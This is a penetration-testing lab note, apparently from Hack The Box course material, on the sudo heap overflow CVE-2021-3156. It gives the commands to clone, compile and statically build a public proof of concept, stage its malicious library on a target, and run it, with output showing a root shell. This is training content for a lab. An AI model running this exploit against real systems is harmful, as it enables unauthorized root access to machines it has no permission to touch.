# Sudo

The program `sudo` is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to administrators. It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```
**One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:**
1. 1.8.31 - Ubuntu 20.04
2. 1.8.27 - Debian 10
3. 1.9.2 - Fedora 33
4. and others

To find out the version of `sudo`, the following command is sufficient:
```
  Sudo
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```
The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public **Proof-Of-Concept** that can be used for this. We can either download this to a copy of the target system we have created or, if we have an internet connection, to the target system itself.
```
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.
```
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

We can find out which version of the operating system we are dealing with using the following command:
```
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```
Next, we specify the respective ID for the version operating system and run the exploit with our payload.
```
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

# PoC
**Since on the target side don't have `make` or `GCC` we could still compile the files on a static way on our attacker host:**
```
┌──(root㉿kali)-[~/CVE-2021-3156]
└─$ ls -l
total 24
-rwxr-xr-x 1 root root 1994 Feb 26 22:25 brute.sh
-rw-r--r-- 1 root root 4420 Feb 26 22:25 hax.c
-rw-r--r-- 1 root root  407 Feb 26 22:25 lib.c
-rw-r--r-- 1 root root  264 Feb 26 22:25 Makefile
-rw-r--r-- 1 root root 1187 Feb 26 22:25 README.md
      
┌──(root㉿kali)-[~/CVE-2021-3156]
└─$ gcc -std=c99 -static -o sudo-hax-me-a-sandwich-static hax.c

┌──(root㉿kali)-[~/CVE-2021-3156]
└─$ gcc -fPIC -shared -static-libgcc -o 'P0P_SH3LLZ_ .so.2' lib.c 

┌──(root㉿kali)-[~/CVE-2021-3156]
└─$ ls -l
total 848
-rwxr-xr-x 1 root root   1994 Feb 26 22:25  brute.sh
-rw-r--r-- 1 root root   4420 Feb 26 22:25  hax.c
-rw-r--r-- 1 root root    407 Feb 26 22:25  lib.c
-rw-r--r-- 1 root root    264 Feb 26 22:25  Makefile
-rwxr-xr-x 1 root root  15728 Feb 26 22:58 'P0P_SH3LLZ_ .so.2'
-rw-r--r-- 1 root root   1187 Feb 26 22:25  README.md
-rwxr-xr-x 1 root root 825000 Feb 26 22:58  sudo-hax-me-a-sandwich-static
```

**On the target side we need to crteate a directory called `libnss_X` to store our `'P0P_SH3LLZ_ .so.2'` file then execute `sudo-hax-me-a-sandwich-static` in order to get a root shell.**

```
htb-student@ubuntu:/tmp$ ls -l
total 832
drwxrwxr-x 2 htb-student htb-student   4096 Feb 27 04:06 libnss_X
drwx------ 3 root        root          4096 Feb 27 02:48 snap-private-tmp
-rwxrwxr-x 1 htb-student htb-student 825000 Feb 27 03:58 sudo-hax-me-a-sandwich-static
drwx------ 3 root        root          4096 Feb 27 02:47 systemd-private-1c25b436759c49c4becb8cd626baad63-systemd-logind.service-oyUS4i
drwx------ 3 root        root          4096 Feb 27 02:47 systemd-private-1c25b436759c49c4becb8cd626baad63-systemd-resolved.service-qnlTVh
drwx------ 3 root        root          4096 Feb 27 02:47 systemd-private-1c25b436759c49c4becb8cd626baad63-systemd-timesyncd.service-WeISfj
drwx------ 2 root        root          4096 Feb 27 02:47 vmware-root_742-2991137376
htb-student@ubuntu:/tmp$ ls -l libnss_X
total 16
-rwxrwxr-x 1 htb-student htb-student 15728 Feb 27 03:58 'P0P_SH3LLZ_ .so.2'
htb-student@ubuntu:/tmp$ sudo -V | head -n1
Sudo version 1.8.21p2
htb-student@ubuntu:/tmp$ ./sudo-hax-me-a-sandwich-static

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich-static <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich-static <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

htb-student@ubuntu:/tmp$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"
htb-student@ubuntu:/tmp$ ./sudo-hax-me-a-sandwich-static 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1001(htb-student)
# cd /root
# pwd
/root
#   
```

